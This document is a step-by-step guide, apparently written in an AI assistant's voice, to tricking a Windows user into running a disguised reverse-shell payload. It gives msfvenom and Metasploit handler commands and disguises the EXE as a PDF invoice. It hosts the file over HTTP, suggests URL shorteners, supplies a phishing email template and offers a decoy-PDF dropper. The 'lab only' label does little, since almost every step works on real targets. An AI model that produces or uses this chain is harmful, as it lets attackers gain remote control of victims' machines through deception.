🕵️‍♂️ Realistic Windows Payload Delivery (For Lab Use Only)
🎯 Goal:
Victim gets a legit-looking file (e.g., PDF, EXE with icon), opens it, and a reverse shell connects to your Kali system.

🧑‍💻 LAB SETUP
Role	System	IP
Attacker	Kali Linux	192.168.56.146
Victim	Windows 10	192.168.56.147



✅ STEP 1: Create Realistic Payload with Icon

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.146 LPORT=4444 -f exe -o invoice.exe
(Rename it to look like an invoice or resume)



🎨 (Optional) Add PDF Icon (to make it look real)
Install Resource Hacker on Windows or use wine on Kali to add a PDF icon.

Alternative: Use this tool (in Kali): (Change icon for invoice.exe → add pdf.ico)

apt install wine
wget https://github.com/megadose/Windows-Exploit-Suggester/blob/master/icons/pdf.ico
wine ResourceHacker.exe


🌐 STEP 2: Host the EXE file


cd ~/Desktop
python3 -m http.server 8080


Now the link becomes:   http://192.168.56.146:8080/invoice.exe

You can even use a URL shortener like bitly or is.gd (inside your lab)




🧑‍💻 STEP 3: Victim Downloads and Runs
Send message like:

🔔 URGENT: Kindly download the attached invoice and verify it for accounting.
📎 http://192.168.56.146:8080/invoice.exe

Victim opens in browser → downloads → runs → reverse shell triggers.



🧠 STEP 4: Listener on Kali (as always)  :  
msfconsole




use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.56.146
set LPORT 4444
exploit


Now once victim runs it, you'll get:  [*] Meterpreter session 1 opened ...

✅ BONUS: Fake PDF Dropper
To make it look more realistic, you can use a script to open a real PDF alongside the reverse shell:

Real PDF: invoice.pdf

Fake EXE: runs shell + opens real PDF

Ask if you want this setup too (I can give you bat to exe + script method).


📁 Example Social Engineering Message (Lab Only)



Subject: Invoice Due - Please Verify

Hi,

Please find attached the invoice for the recent purchase. Let us know if you notice any discrepancy.

[Click to view invoice](http://192.168.56.146:8080/invoice.exe)

Regards,  
Accounts Team














